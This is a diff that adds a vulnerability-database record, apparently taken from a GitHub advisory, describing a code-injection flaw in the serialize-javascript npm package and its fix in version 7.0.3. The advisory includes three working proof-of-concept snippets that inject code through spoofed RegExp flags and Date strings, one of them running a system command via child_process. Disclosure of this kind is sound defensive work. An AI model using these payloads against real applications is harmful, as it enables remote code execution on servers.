@@ -1,0 +1,138 @@
+advisory_id: GHSA-5c6j-r48x-rmvq
+datasource_id: github_osv/GHSA-5c6j-r48x-rmvq
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-5c6j-r48x-rmvq/GHSA-5c6j-r48x-rmvq.json
+aliases: []
+summary: |
+  Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()
+  ### Impact
+
+  The serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.
+
+  While `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.
+
+  If an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.
+
+  ```javascript
+  const serialize = require('serialize-javascript');
+  // Create an object that passes instanceof RegExp with a spoofed .flags
+  const fakeRegex = Object.create(RegExp.prototype);
+  Object.defineProperty(fakeRegex, 'source', { get: () => 'x' });
+  Object.defineProperty(fakeRegex, 'flags', {
+    get: () => '"+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"'
+  });
+  fakeRegex.toJSON = function() { return '@placeholder'; };
+  const output = serialize({ re: fakeRegex });
+  // Output: {"re":new RegExp("x", ""+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"")}
+  let obj;
+  eval('obj = ' + output);
+  console.log(global.PWNED); // "CODE_INJECTION_VIA_FLAGS" — injected code executed!
+  #h2. PoC 2: Code Injection via Date.toISOString()
+  ```
+
+  ```javascript
+  const serialize = require('serialize-javascript');
+  const fakeDate = Object.create(Date.prototype);
+  fakeDate.toISOString = function() { return '"+(global.DATE_PWNED="DATE_INJECTION")+"'; };
+  fakeDate.toJSON = function() { return '2024-01-01'; };
+  const output = serialize({ d: fakeDate });
+  // Output: {"d":new Date(""+(global.DATE_PWNED="DATE_INJECTION")+"")}
+  eval('obj = ' + output);
+  console.log(global.DATE_PWNED); // "DATE_INJECTION" — injected code executed!
+  #h2. PoC 3: Remote Code Execution
+  ```
+
+  ```javascript
+  const serialize = require('serialize-javascript');
+  const rceRegex = Object.create(RegExp.prototype);
+  Object.defineProperty(rceRegex, 'source', { get: () => 'x' });
+  Object.defineProperty(rceRegex, 'flags', {
+    get: () => '"+require("child_process").execSync("id").toString()+"'
+  });
+  rceRegex.toJSON = function() { return '@rce'; };
+  const output = serialize({ re: rceRegex });
+  // Output: {"re":new RegExp("x", ""+require("child_process").execSync("id").toString()+"")}
+  // When eval'd on a Node.js server, executes the "id" system command
+  ```
+
+  ### Patches
+
+  The fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3
+impacted_packages:
+  - purl: pkg:npm/serialize-javascript
+    affected_versions: vers:npm/<=7.0.2
+    fixed_versions: vers:npm/7.0.3
+    affected_packages:
+      - pkg:npm/serialize-javascript@1.0.0
+      - pkg:npm/serialize-javascript@1.1.2
+      - pkg:npm/serialize-javascript@1.2.0
+      - pkg:npm/serialize-javascript@1.3.0
+      - pkg:npm/serialize-javascript@1.4.0
+      - pkg:npm/serialize-javascript@1.5.0
+      - pkg:npm/serialize-javascript@1.6.0
+      - pkg:npm/serialize-javascript@1.6.1
+      - pkg:npm/serialize-javascript@1.7.0
+      - pkg:npm/serialize-javascript@1.8.0
+      - pkg:npm/serialize-javascript@1.9.0
+      - pkg:npm/serialize-javascript@1.9.1
+      - pkg:npm/serialize-javascript@2.0.0
+      - pkg:npm/serialize-javascript@2.1.0
+      - pkg:npm/serialize-javascript@2.1.1
+      - pkg:npm/serialize-javascript@2.1.2
+      - pkg:npm/serialize-javascript@3.0.0
+      - pkg:npm/serialize-javascript@3.1.0
+      - pkg:npm/serialize-javascript@4.0.0
+      - pkg:npm/serialize-javascript@5.0.0
+      - pkg:npm/serialize-javascript@5.0.1
+      - pkg:npm/serialize-javascript@6.0.0
+      - pkg:npm/serialize-javascript@6.0.1
+      - pkg:npm/serialize-javascript@6.0.2
+      - pkg:npm/serialize-javascript@7.0.0
+      - pkg:npm/serialize-javascript@7.0.1
+      - pkg:npm/serialize-javascript@7.0.2
+    fixed_packages:
+      - pkg:npm/serialize-javascript@7.0.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/yahoo/serialize-javascript
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/yahoo/serialize-javascript
+        commit: 2e609d0a9f4f5b097f0945af88bd45b9c7fb48d9
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-5c6j-r48x-rmvq/GHSA-5c6j-r48x-rmvq.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-96
+references:
+  - url: https://github.com/yahoo/serialize-javascript
+    reference_type:
+    reference_id:
+  - url: https://github.com/yahoo/serialize-javascript/commit/2e609d0a9f4f5b097f0945af88bd45b9c7fb48d9
+    reference_type:
+    reference_id:
+  - url: https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2020-7660
+    reference_type:
+    reference_id: CVE-2020-7660
+  - url: https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-5c6j-r48x-rmvq
+    reference_type:
+    reference_id: GHSA-5c6j-r48x-rmvq
+  - url: https://github.com/advisories/GHSA-hxcc-f52p-wc94
+    reference_type:
+    reference_id: GHSA-hxcc-f52p-wc94
+exploits: []
